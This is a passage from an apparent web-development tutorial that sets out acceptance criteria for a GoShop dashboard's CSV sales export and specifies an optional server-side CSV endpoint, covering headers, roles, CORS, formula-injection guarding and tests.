- The per-period file opens in columns, with "Café" intact, in Excel under Indonesian regional settings (or in LibreOffice with `;` and UTF-8, if you have no Excel), and imports into Google Sheets with numbers as numbers and dates as dates.
- While a new range loads, the buttons are `aria-disabled` and do nothing; a file never holds a range other than its name says.
- No `securitypolicyviolation` and no console error in the production build served with the Caddyfile; the Caddyfile is unchanged; every object URL is revoked.
- A screen reader hears the buttons' purpose and the "diunduh" status; the focus stays on the button.
- Unit tests cover the pure function (quoting, the injection guard on text cells only, the BOM, the separator, partial periods, tied ranks), and `make build lint test-unit` passes.

### Stretch: the API exports it

The same export from the server, `GET /v1/admin/reports/sales.csv`, for when the CSV must hold more than the screen does (every order of the range, say) or be produced without a browser (a monthly email). Spec only; build it in `apps/api` like any endpoint.

- **The contract.** The same query as `GET /v1/admin/reports/sales` (`from`, `to`, `group`), the same validation and the same roles (seller and admin). A bad range is still a `400` with the JSON error body: a client that asked for a file must still be able to read why it got none. Success: `200`, `Content-Type: text/csv; charset=utf-8`, `Content-Disposition: attachment; filename="goshop-penjualan_….csv"`, `Cache-Control: no-store` (sales figures are private). The body: the BOM, then exactly the columns above, from the same report query (no second SQL for the same numbers). Document it in `api/openapi.yaml` (a `text/csv` response with `type: string` and an example), lint clean.
- **Go.** `encoding/csv` with `Comma = ';'` and `UseCRLF = true` quotes correctly, but does not guard formulas: apply the same rule as the browser before `Write`, and write the rule down once (the ADR or the contract) so the two cannot drift.
- **A path or `Accept`?** `Accept: text/csv` on the existing path is the purist's answer; then every cache in between needs `Vary: Accept`, the OpenAPI operation has two success bodies, and a link cannot choose. A separate `.csv` path is plainer to document, test and link. Choose, and write down why.
- **How the dashboard downloads it.** The API wants `Authorization: Bearer`, which a plain `<a href>` cannot send, and the dashboard's refresh cookie is only for the auth endpoints. So the dashboard still fetches it and saves a `Blob`. To read the server's file name, `Content-Disposition` must be in the CORS `ExposedHeaders` (`apps/api/internal/httpserver/router.go`'s list has `X-Request-ID`, `Retry-After`, `Location`, `X-Cart-Token` and `Idempotency-Replayed` today; a header left off it is invisible to the script, even though the browser received it), or the client names the file itself. A token in the query string would make a plain link work, and would leave it in every access log: the reason artikel 09 did not use `EventSource`.
- **Tests** (test-engineer): the headers, the BOM, the separator, the guard, `400` for a range over 366 days, `401` without a token, `403` for a buyer.
- **Then answer:** which export does GoShop need, the browser's or the server's? The browser's costs the server nothing and exports exactly what the seller is looking at; the server's is the one that scales past the screen. Most dashboards need the first and, later, the second for something else.
